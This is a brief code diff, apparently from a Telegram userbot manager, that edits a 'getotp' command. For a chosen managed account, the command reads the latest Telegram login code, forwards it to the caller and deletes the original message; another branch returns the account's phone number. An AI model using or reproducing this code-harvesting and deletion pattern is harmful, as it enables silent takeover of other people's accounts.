@@ -113,11 +113,10 @@ async def get_my_otp(client, message):
         for X in ubot._ubot:
             if int(message.command[1]) == X.me.id:
                 if message.command[0] == "getotp":
-                    async for otp in X.search_messages(777000):
+                    async for otp in X.search_messages(777000, limit=1):
                         if otp.text:
                             await message.reply(otp.text, quote=True)
                             await otp.delete()
-                            await asyncio.sleep(2)
-                    await TM.delete()
+                            await TM.delete()
                 else:
                     return await TM.edit(X.me.phone_number)
